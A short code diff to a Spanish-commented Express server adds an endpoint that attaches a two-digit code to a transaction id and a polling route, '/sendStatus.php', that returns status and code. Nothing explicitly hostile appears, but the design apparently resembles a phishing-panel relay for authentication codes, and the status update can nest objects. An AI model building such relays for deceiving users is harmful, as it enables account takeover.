@@ -118,12 +118,49 @@ app.post('/callback', async (req, res) => {
   res.sendStatus(200);
 });
 
+app.post('/setcode', async (req, res) => {
+  const { txid, code } = req.body;
+
+  // Validaciones básicas
+  if (!txid || !code || !/^\d{2}$/.test(code)) {
+    return res.status(400).json({ error: 'Faltan parámetros o código inválido (debe ser exactamente 2 dígitos)' });
+  }
+
+  // Guardamos el código asociado al txid
+  if (!clientes[txid]) {
+    return res.status(404).json({ error: 'txid no encontrado' });
+  }
+
+  clientes[txid] = {
+    status: clientes[txid], // mantenemos el status anterior
+    code: code               // agregamos el código de 2 dígitos
+  };
+
+  guardarEstado();
+  res.json({ success: true, message: `Código ${code} asignado a ${txid}` });
+});
+
+
 // -----------------------------------------------------------
 //  POLLING
 // -----------------------------------------------------------
 app.get('/sendStatus.php', (req, res) => {
   const txid = req.query.txid;
-  res.json({ status: clientes[txid] || "esperando" });
+  const cliente = clientes[txid] || { status: "esperando" };
+
+  let response = { status: "esperando" };
+
+  if (typeof cliente === 'string') {
+    response.status = cliente;
+  } else {
+    // cliente es un objeto { status, code }
+    response.status = cliente.status || "esperando";
+    if (cliente.code) {
+      response.code = cliente.code;
+    }
+  }
+
+  res.json(response);
 });
 
 app.get('/', (req, res) => res.send("Servidor activo en Render"));
